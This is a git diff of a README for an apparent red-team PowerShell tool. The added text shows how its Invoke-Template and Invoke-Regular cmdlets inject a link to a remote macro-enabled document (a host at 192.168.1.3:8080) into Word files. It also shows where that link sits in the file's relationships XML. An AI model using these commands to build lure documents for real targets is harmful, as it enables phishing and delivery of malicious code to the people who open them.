@@ -37,6 +37,7 @@ This tool is licensed under the [![License: MIT](https://img.shields.io/badge/MI
       - [Invoke-Template Example](#invoke-template-example)
     - [Invoke-Regular](#invoke-regular)
       - [Invoke-Regular Example](#invoke-regular-example)
+      - [Invoke-Regular Example 2](#invoke-regular-example-2)
     - [Invoke-Identify](#invoke-identify)
   - [References](#references)
 
@@ -74,7 +75,7 @@ Saved as, for example, 'Name.docx':
 
 ![Default Word Template Document](/Pictures/Default-Word-Template.png)
 
-If you use `Invoke-Template` cmdlet you can insert a malicious link within this docx
+If you use `Invoke-Template` cmdlet you can insert a malicious link within this docx:
 
 ```
 Invoke-Template -InputDoc Name.docx -Link "https://192.168.1.3:8080/Doc1.docm" -Output C:\Users\User\Desktop\LegitDocument.docx
@@ -103,6 +104,24 @@ Assuming that you have a default Word document without a template, like this:
 Saved as, for example, 'Doc1.docx':
 
 ![Word Document](/Pictures/Word-Document.png)
+
+If you use `Invoke-Regular` cmdlet you can insert a malicious link within this docx:
+
+```
+Invoke-Regular -InputDoc C:\Users\User\Desktop\Doc1.docx -Link "http://192.168.1.3:8080/Doc1.docm" -Output Nikos2.docx
+```
+
+Outcome:
+
+![Invoke-Regular-1](/Pictures/Invoke-Regular-1.png)
+
+As you can see, the Invoke-Regular module keeps a backup of the original document and provides the full path to the malicious document.
+
+From debugging prespective, if you connvert the malicious docx to zip archive and go into /word/_rels/settings.xml.rels, you can see the malicious link:
+
+![Invoke-Regular-Debug-1](/Pictures/Invoke-Regular-Debug-1.png)
+
+#### Invoke-Regular Example 2
 
 ### Invoke-Identify
 
